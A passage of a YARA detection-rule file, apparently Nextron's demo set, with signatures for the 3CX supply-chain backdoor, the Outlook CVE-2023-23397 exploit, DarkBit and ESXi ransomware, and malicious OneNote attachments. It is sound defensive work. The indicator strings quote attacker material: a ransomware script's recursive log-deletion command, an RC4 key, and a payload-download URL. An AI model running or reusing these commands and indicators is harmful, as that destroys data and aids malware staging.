\"a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67\"\n      hash2 = \"fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7\"\n      tags = \"APT, DEMO, MACOS, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 37 15 00 13 16 16 1B 55 4F 54 4A 5A 52 2D 13 14 \n               1E 15 0D 09 5A 34 2E 5A 4B 4A 54 4A 41 5A 2D 13\n               14 4C 4E 41 5A 02 4C 4E 53 5A 3B 0A 0A 16 1F 2D\n               1F 18 31 13 0E 55 4F 49 4D 54 49 4C 5A 52 31 32\n               2E 37 36 56 5A 16 13 11 1F 5A 3D 1F 19 11 15 53\n               5A 39 12 08 15 17 1F 55 4B 4A 42 54 4A 54 4F 49\n               4F 43 54 4B 48 42 5A 29 1B 1C 1B 08 13 55 4F 49\n               4D 54 49 4C 7A } \n      $xc2 = { 41 49 19 02 25 1b 0f 0e 12 25 0e 15 11 1f 14 25 19 15 14 0e 1f 14 0e 47 5f 09 41 25 25 0e 0f 0e 17 1b 47 } \n      $xc3 = { 55 29 03 09 0e 1f 17 55 36 13 18 08 1b 08 03 55 39 15 08 1f 29 1f 08 0c 13 19 1f 09 55 29 03 09 0e 1f 17 2c 1f 08 09 13 15 14 54 0a 16 13 09 0e } \n   condition: \n      1 of them\n}\n\nrule APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1_RID3572 : APT DEMO NK SUSP {\n   meta:\n      description = \"Detects indicator (event name) found in samples related to 3CX compromise\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/\"\n      date = \"2023-03-30 16:13:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896\"\n      hash2 = \"59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983\"\n      hash3 = \"aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868\"\n      tags = \"APT, DEMO, NK, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"AVMonitorRefreshEvent\" wide fullword\n   condition: \n      1 of them\n}\n\nrule MAL_3CXDesktopApp_MacOS_Backdoor_Mar23_RID348D : DEMO FILE MACOS MAL {\n   meta:\n      description = \"Detects 3CXDesktopApp MacOS backdoor component\"\n      author = \"X__Junior (Nextron Systems)\"\n      reference = \"https://www.volexity.com/blog/2023/03/30/3cx-supply-chain-compromise-leads-to-iconic-incident/\"\n      date = \"2023-03-30 15:35:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, MACOS, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"%s/.main_storage\" ascii fullword\n      $sa2 = \"%s/UpdateAgent\" ascii fullword\n      $op1 = { 31 C0 41 80 34 06 ?? 48 FF C0 48 83 F8 ?? 75 ?? BE ?? ?? ?? ?? BA ?? ?? ?? ?? 4C 89 F7 48 89 D9 E8 ?? ?? ?? ?? 48 89 DF E8 ?? ?? ?? ?? 48 89 DF E8 ?? ?? ?? ?? 4C 89 F7 5B 41 5E 41 5F E9 ?? ?? ?? ?? 5B 41 5E 41 5F C3} \n      $op2 = { 0F 11 84 24 ?? ?? ?? ?? 0F 28 05 ?? ?? ?? ?? 0F 29 84 24 ?? ?? ?? ?? 0F 28 05 ?? ?? ?? ?? 0F 29 84 24 ?? ?? ?? ?? 31 C0 80 B4 04 ?? ?? ?? ?? ?? 48 FF C0} \n   condition: \n      ( ( uint16 ( 0 ) == 0xfeca or uint16 ( 0 ) == 0xfacf or uint32 ( 0 ) == 0xbebafeca ) and filesize < 6MB and ( ( 1 of ( $sa* ) and 1 of ( $op* ) ) or all of ( $sa* ) ) ) or ( all of ( $op* ) )\n}\n\nrule MAL_3CXDesktopApp_MacOS_UpdateAgent_Mar23_RID35BA : DEMO MACOS MAL {\n   meta:\n      description = \"Detects 3CXDesktopApp MacOS UpdateAgent backdoor component\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://twitter.com/patrickwardle/status/1641692164303515653?s=20\"\n      date = \"2023-03-30 16:25:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MACOS, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"/3CX Desktop App/.main_storage\" ascii\n      $x1 = \";3cx_auth_token_content=%s;__tutma=true\" \n      $s1 = \"\\\"url\\\": \\\"https://\" \n      $s3 = \"/dev/null\" \n      $s4 = \"\\\"AccountName\\\": \\\"\" \n   condition: \n      uint16 ( 0 ) == 0xfeca and filesize < 6MB and ( 1 of ( $x* ) or ( $a1 and all of ( $s* ) ) ) or all of them\n}\n\nrule APT_MAL_NK_3CX_Malicious_Samples_Mar23_1_RID3501 : APT DEMO EXE FILE MAL NK {\n   meta:\n      description = \"Detects malicious DLLs related to 3CX compromise\"\n      author = \"X__Junior, Florian Roth (Nextron Systems)\"\n      reference = \"https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/\"\n      date = \"2023-03-29 15:54:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-04-20\"\n      hash1 = \"7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896\"\n      hash2 = \"c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02\"\n      hash3 = \"cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, NK\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $opa1 = { 4C 89 F1 4C 89 EA 41 B8 40 00 00 00 FF 15 ?? ?? ?? ?? 85 C0 74 ?? 4C 89 F0 FF 15 ?? ?? ?? ?? 4C 8D 4C 24 ?? 45 8B 01 4C 89 F1 4C 89 EA FF 15 } \n      $opa2 = { 48 C7 44 24 ?? 00 00 00 00 4C 8D 7C 24 ?? 48 89 F9 48 89 C2 41 89 E8 4D 89 F9 FF 15 ?? ?? ?? ?? 41 83 3F 00 0F 84 ?? ?? ?? ?? 0F B7 03 3D 4D 5A 00 00} \n      $opa3 = { 41 80 7C 00 ?? FE 75 ?? 41 80 7C 00 ?? ED 75 ?? 41 80 7C 00 ?? FA 75 ?? 41 80 3C 00 CE} \n      $opa4 = { 44 0F B6 CD 46 8A 8C 0C ?? ?? ?? ?? 45 30 0C 0E 48 FF C1} \n      $opb1 = { 41 B8 40 00 00 00 49 8B D5 49 8B CC FF 15 ?? ?? ?? ?? 85 C0 74 ?? 41 FF D4 44 8B 45 ?? 4C 8D 4D ?? 49 8B D5 49 8B CC FF 15 } \n      $opb2 = { 44 8B C3 48 89 44 24 ?? 48 8B 5C 24 ?? 4C 8D 4D ?? 48 8B CB 48 89 74 24 ?? 48 8B D0 4C 8B F8 FF 15 } \n      $opb3 = { 80 78 ?? FE 75 ?? 80 78 ?? ED 75 ?? 80 38 FA 75 ?? 80 78 ?? CE } \n      $opb4 = { 49 63 C1 44 0F B6 44 05 ?? 44 88 5C 05 ?? 44 88 02 0F B6 54 05 ?? 49 03 D0 0F B6 C2 0F B6 54 05 ?? 41 30 12} \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5MB and pe.characteristics & pe.DLL and ( 2 of ( $opa* ) or 2 of ( $opb* ) )\n}\n\nrule APT_MAL_NK_3CX_Malicious_Samples_Mar23_2_RID3502 : APT DEMO EXE MAL NK {\n   meta:\n      description = \"Detects malicious DLLs related to 3CX compromise (decrypted payload)\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://twitter.com/dan__mayer/status/1641170769194672128?s=20\"\n      date = \"2023-03-29 15:54:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973\"\n      tags = \"APT, DEMO, EXE, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"raw.githubusercontent.com/IconStorages/images/main/icon%d.ico\" wide fullword\n      $s2 = \"https://raw.githubusercontent.com/IconStorages\" wide fullword\n      $s3 = \"icon%d.ico\" wide fullword\n      $s4 = \"__tutmc\" ascii fullword\n      $op1 = { 2d ee a1 00 00 c5 fa e6 f5 e9 40 fe ff ff 0f 1f 44 00 00 75 2e c5 fb 10 0d 46 a0 00 00 44 8b 05 7f a2 00 00 e8 0a 0e 00 00 } \n      $op4 = { 4c 8d 5c 24 71 0f 57 c0 48 89 44 24 60 89 44 24 68 41 b9 15 cd 5b 07 0f 11 44 24 70 b8 b1 68 de 3a 41 ba a4 7b 93 02 } \n      $op5 = { f7 f3 03 d5 69 ca e8 03 00 00 ff 15 c9 0a 02 00 48 8d 44 24 30 45 33 c0 4c 8d 4c 24 38 48 89 44 24 20 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 3 of them or 5 of them\n}\n\nrule APT_MAL_NK_3CX_Malicious_Samples_Mar23_3_RID3503 : APT DEMO MAL NK {\n   meta:\n      description = \"Detects malicious DLLs related to 3CX compromise (decrypted payload)\"\n      author = \"Florian Roth , X__Junior (Nextron Systems)\"\n      reference = \"https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/\"\n      date = \"2023-03-29 15:55:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973\"\n      tags = \"APT, DEMO, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $opa1 = { 41 81 C0 ?? ?? ?? ?? 02 C8 49 C1 E9 ?? 41 88 4B ?? 4D 03 D1 8B C8 45 8B CA C1 E1 ?? 33 C1 41 69 D0 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 81 C2 ?? ?? ?? ?? 33 C1 43 8D 0C 02 02 C8 49 C1 EA ?? 41 88 0B 8B C8 C1 E1 ?? 33 C1 44 69 C2 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 41 81 C0 } \n      $opa2 = { 8B C8 41 69 D1 ?? ?? ?? ?? C1 E1 ?? 33 C1 45 8B CA 8B C8 C1 E9 ?? 33 C1 81 C2 ?? ?? ?? ?? 8B C8 C1 E1 ?? 33 C1 41 8B C8 4C 0F AF CF 44 69 C2 ?? ?? ?? ?? 4C 03 C9 45 8B D1 4C 0F AF D7} \n      $opb1 = { 45 33 C9 48 89 6C 24 ?? 48 8D 44 24 ?? 48 89 6C 24 ?? 8B D3 48 89 B4 24 ?? ?? ?? ?? 48 89 44 24 ?? 45 8D 41 ?? FF 15 } \n      $opb2 = { 44 8B 0F 45 8B C6 48 8B 4D ?? 49 8B D7 44 89 64 24 ?? 48 89 7C 24 ?? 44 89 4C 24 ?? 4C 8D 4D ?? 48 89 44 24 ?? 44 89 64 24 ?? 4C 89 64 24 ?? FF 15} \n      $opb3 = { 48 FF C2 66 44 39 2C 56 75 ?? 4C 8D 4C 24 ?? 45 33 C0 48 8B CE FF 15 ?? ?? ?? ?? 85 C0 0F 84 ?? ?? ?? ?? 44 0F B7 44 24 ?? 33 F6 48 8B 54 24 ?? 45 33 C9 48 8B 0B 48 89 74 24 ?? 89 74 24 ?? C7 44 24 ?? ?? ?? ?? ?? 48 89 74 24 ?? FF 15 } \n      $opb4 = { 33 C0 48 8D 6B ?? 4C 8D 4C 24 ?? 89 44 24 ?? BA ?? ?? ?? ?? 48 89 44 24 ?? 48 8B CD 89 44 24 ?? 44 8D 40 ?? 8B F8 FF 15} \n   condition: \n      ( all of ( $opa* ) ) or ( 1 of ( $opa* ) and 1 of ( $opb* ) ) or ( 3 of ( $opb* ) )\n}\n\nrule SUSP_APT_MAL_NK_3CX_Malicious_Samples_Mar23_1_RID36AB : APT DEMO MAL NK SUSP {\n   meta:\n      description = \"Detects marker found in malicious DLLs related to 3CX compromise\"\n      author = \"X__Junior, Florian Roth (Nextron Systems)\"\n      reference = \"https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/\"\n      date = \"2023-03-29 17:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-04-20\"\n      hash1 = \"7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896\"\n      hash2 = \"c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02\"\n      hash3 = \"cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2\"\n      tags = \"APT, DEMO, MAL, NK, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $opx1 = { 41 80 7C 00 FD FE 75 ?? 41 80 7C 00 FE ED 75 ?? 41 80 7C 00 FF FA 75 ?? 41 80 3C 00 CE } \n      $opx2 = { 80 78 ?? FE 75 ?? 80 78 ?? ED 75 ?? 80 38 FA 75 ?? 80 78 ?? CE } \n   condition: \n      1 of them\n}\n\nrule APT_SUSP_NK_3CX_RC4_Key_Mar23_1_RID30E9 : APT DEMO EXE FILE NK SUSP {\n   meta:\n      description = \"Detects RC4 key used in 3CX binaries known to be malicious\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/\"\n      date = \"2023-03-29 13:00:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896\"\n      hash2 = \"59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983\"\n      hash3 = \"aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868\"\n      tags = \"APT, DEMO, EXE, FILE, NK, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"3jB(2bsG#@c7\" \n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 or uint16 ( 0 ) == 0x5a4d ) and $x1\n}\n\nrule SUSP_3CX_App_Signed_Binary_Mar23_1_RID32FA : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects 3CX application binaries signed with a certificate and created in a time frame in which other known malicious binaries have been created\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/\"\n      date = \"2023-03-29 14:28:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405\"\n      hash2 = \"dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $sa1 = \"3CX Ltd1\" \n      $sa2 = \"3CX Desktop App\" wide\n      $sc1 = { 1B 66 11 DF 9C 9A 4D 6E CC 8E D5 0C 9B 91 78 73 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and pe.timestamp > 1669680000 and pe.timestamp < 1680108505 and all of ( $sa* ) and $sc1\n}\n\nrule SUSP_3CX_MSI_Signed_Binary_Mar23_1_RID32C2 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects 3CX MSI installers signed with a known compromised certificate and signed in a time frame in which other known malicious binaries have been signed\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/\"\n      date = \"2023-03-29 14:18:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868\"\n      hash2 = \"59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = { 84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46 } \n      $sc1 = { 1B 66 11 DF 9C 9A 4D 6E CC 8E D5 0C 9B 91 78 73 } \n      $s1 = \"3CX Ltd1\" \n      $s2 = \"202303\" \n   condition: \n      uint16 ( 0 ) == 0xcfd0 and $a1 and $sc1 and ( $s1 in ( filesize - 20000 .. filesize ) and $s2 in ( filesize - 20000 .. filesize ) )\n}\n\nrule APT_MAL_NK_3CX_Malicious_Samples_Mar23_4_RID3504 : APT DEMO MAL NK {\n   meta:\n      description = \"Detects decrypted payload loaded inside 3CXDesktopApp.exe which downloads info stealer\"\n      author = \"MalGamy (Nextron Systems)\"\n      reference = \"https://twitter.com/WhichbufferArda/status/1641404343323688964?s=20\"\n      date = \"2023-03-29 15:55:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = {41 69 D0 [4] 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 81 C2 [4] 33 C1 43 8D 0C 02 02 C8 49 C1 EA ?? 41 88 0B 8B C8 C1 E1 ?? 33 C1 44 69 C2 [4] 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 41 81 C0 [4] 33 C1 4C 0F AF CF 4D 03 CA 45 8B D1 4C 0F AF D7 41 8D 0C 11 49 C1 E9 ?? 02 C8} \n      $op2 = {4D 0F AF CC 44 69 C2 [4] 4C 03 C9 45 8B D1 4D 0F AF D4 41 8D 0C 11 41 81 C0 [4] 02 C8 49 C1 E9 ?? 41 88 4B ?? 4D 03 D1 8B C8 45 8B CA C1 E1 ?? 33 C1} \n      $op3 = {33 C1 4C 0F AF C7 8B C8 C1 E1 ?? 4D 03 C2 33 C1} \n   condition: \n      2 of them\n}\n\nrule EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23_RID363D : CVE_2023_23397 DEMO EXPLOIT FILE SUSP T1020 {\n   meta:\n      description = \"Detects suspicious .msg file with a PidLidReminderFileParameter property exploiting CVE-2023-23397 (modified delivr.to rule - more specific = less FPs but limited to exfil using IP addresses, not FQDNs)\"\n      author = \"delivr.to, Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl\"\n      reference = \"https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/\"\n      date = \"2023-03-15 16:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-03-18\"\n      tags = \"CVE_2023_23397, DEMO, EXPLOIT, FILE, SUSP, T1020\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 } \n      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 } \n      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 } \n      $rfp = { 1F 85 00 00 } \n      $u1 = { 5C 00 5C 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 3? 00 3? 00|3? 00 3? 00|3? 00) } \n      $u2 = { 00 5C 5C (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 3? 3?|3? 3?|3?) } \n      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46} \n   condition: \n      ( uint16 ( 0 ) == 0xCFD0 and 1 of ( $psetid* ) or uint32be ( 0 ) == 0x789F3E22 ) and any of ( $u* ) and $rfp and not 1 of ( $fp* )\n}\n\nrule MAL_RANSOM_DarkBit_Feb23_1_RID2F7B : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects indicators found in DarkBit ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/idonaor1/status/1624703255770005506?s=12&t=mxHaauzwR6YOj5Px8cIeIw\"\n      date = \"2023-02-13 11:59:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".onion\" ascii\n      $s2 = \"GetMOTWHostUrl\" \n      $x1 = \"hus31m7c7ad.onion\" \n      $x2 = \"iw6v2p3cruy\" \n      $xn1 = \"You will receive decrypting key after the payment.\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10MB and ( 1 of ( $x* ) or 2 of them ) or 4 of them or ( filesize < 10MB and $xn1 )\n}\n\nrule MAL_RANSOM_SH_ESXi_Attacks_Feb23_2_RID3258 : CRIME DEMO MAL RANSOM SCRIPT {\n   meta:\n      description = \"Detects script used in ransomware attacks exploiting and encrypting ESXi servers\"\n      author = \"Florian Roth\"\n      reference = \"https://dev.to/xakrume/esxiargs-encryption-malware-launches-massive-attacks-against-vmware-esxi-servers-pfe\"\n      date = \"2023-02-06 14:01:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CRIME, DEMO, MAL, RANSOM, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"echo \\\"START ENCRYPT: $file_e SIZE: $size_kb STEP SIZE: \" ascii\n   condition: \n      filesize < 10KB and 1 of them\n}\n\nrule MAL_RANSOM_SH_ESXi_Attacks_Feb23_1_RID3257 : CRIME DEMO MAL RANSOM SCRIPT {\n   meta:\n      description = \"Detects script used in ransomware attacks exploiting and encrypting ESXi servers - file encrypt.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14\"\n      date = \"2023-02-04 14:01:01\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"10c3b6b03a9bf105d264a8e7f30dcab0a6c59a414529b0af0a6bd9f1d2984459\"\n      tags = \"CRIME, DEMO, MAL, RANSOM, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/bin/find / -name *.log -exec /bin/rm -rf {} \\\\;\" ascii fullword\n      $x2 = \"/bin/touch -r /etc/vmware/rhttpproxy/config.xml /bin/hostd-probe.sh\" ascii fullword\n      $x3 = \"grep encrypt | /bin/grep -v grep | /bin/wc -l)\" ascii fullword\n      $s1 = \"## ENCRYPT\" ascii fullword\n      $s2 = \"/bin/find / -name *.log -exec /bin\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x2123 and filesize < 10KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them\n}\n\nrule MAL_RANSOM_ELF_ESXi_Attacks_Feb23_1_RID3293 : CRIME DEMO LINUX MAL RANSOM {\n   meta:\n      description = \"Detects ransomware exploiting and encrypting ESXi servers\"\n      author = \"Florian Roth\"\n      reference = \"https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14\"\n      date = \"2023-02-04 14:11:01\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"11b1b2375d9d840912cfd1f0d0d04d93ed0cddb0ae4ddb550a5b62cd044d6b66\"\n      tags = \"CRIME, DEMO, LINUX, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]\" ascii fullword\n      $x2 = \"[ %s ] - FAIL { Errno: %d }\" ascii fullword\n      $s1 = \"lPEM_read_bio_RSAPrivateKey\" ascii fullword\n      $s2 = \"lERR_get_error\" ascii fullword\n      $s3 = \"get_pk_data: key file is empty!\" ascii fullword\n      $op1 = { 8b 45 a8 03 45 d0 89 45 d4 8b 45 a4 69 c0 07 53 65 54 89 45 a8 8b 45 a8 c1 c8 19 } \n      $op2 = { 48 89 95 40 fd ff ff 48 83 bd 40 fd ff ff 00 0f 85 2e 01 00 00 48 8b 9d 50 ff ff ff 48 89 9d 30 fd ff ff 48 83 bd 30 fd ff ff 00 78 13 f2 48 0f 2a 85 30 fd ff ff } \n      $op3 = { 31 55 b4 f7 55 b8 8b 4d ac 09 4d b8 8b 45 b8 31 45 bc c1 4d bc 13 c1 4d b4 1d } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 200KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them\n}\n\nrule SUSP_Email_Suspicious_OneNote_Attachment_Jan23_1_RID3925 : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious OneNote attachment that embeds suspicious payload, e.g. an executable (FPs possible if the PE is attached separately)\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2023-01-27 18:51:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ge1 = \"5xbjvWUmEUWkxI1NC3qer\" \n      $ge2 = \"cW471lJhFFpMSNTQt6nq\" \n      $ge3 = \"nFuO9ZSYRRaTEjU0Lep6s\" \n      $sp1 = \"VGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZG\" \n      $sp2 = \"RoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl\" \n      $sp3 = \"UaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZ\" \n      $sp4 = \"VGhpcyBwcm9ncmFtIG11c3QgYmUgcnVuIHVuZGVy\" \n      $sp5 = \"RoaXMgcHJvZ3JhbSBtdXN0IGJlIHJ1biB1bmRlc\" \n      $sp6 = \"UaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZX\" \n      $se1 = \"QGVjaG8gb2Zm\" \n      $se2 = \"BlY2hvIG9mZ\" \n      $se3 = \"AZWNobyBvZm\" \n      $se4 = \"PEhUQTpBUFBMSUNBVElPTi\" \n      $se5 = \"xIVEE6QVBQTElDQVRJT04g\" \n      $se6 = \"8SFRBOkFQUExJQ0FUSU9OI\" \n      $se7 = \"TAAAAAEUAg\" \n      $se8 = \"wAAAABFAIA\" \n      $se9 = \"MAAAAARQCA\" \n   condition: \n      filesize < 5MB and 1 of ( $ge* ) and 1 of ( $s* )\n}\n\nrule SUSP_Email_Suspicious_OneNote_Attachment_Jan23_2_RID3926 : DEMO SUSP T1203 T1566_001 {\n   meta:\n      description = \"Detects suspicious OneNote attachment that has a file name often used in phishing attacks\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2023-01-27 18:51:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $hc1 = { 2E 6F 6E 65 22 0D 0A 0D 0A 35 46 4A 63 65 } \n      $x01 = \" attachment; filename=\\\"Invoice\" nocase\n      $x02 = \" attachment; filename=\\\"ORDER\" nocase\n      $x03 = \" attachment; filename=\\\"PURCHASE\" nocase\n      $x04 = \" attachment; filename=\\\"SHIP\" nocase\n   condition: \n      filesize < 5MB and $hc1 and 1 of ( $x* )\n}\n\nrule SUSP_OneNote_Embedded_FileDataStoreObject_Type_Jan23_1_RID3B07 : DEMO SUSP {\n   meta:\n      description = \"Detects suspicious embedded file types in OneNote files\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.didierstevens.com/\"\n      date = \"2023-01-27 20:11:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-02-27\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac \n              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n              ?? 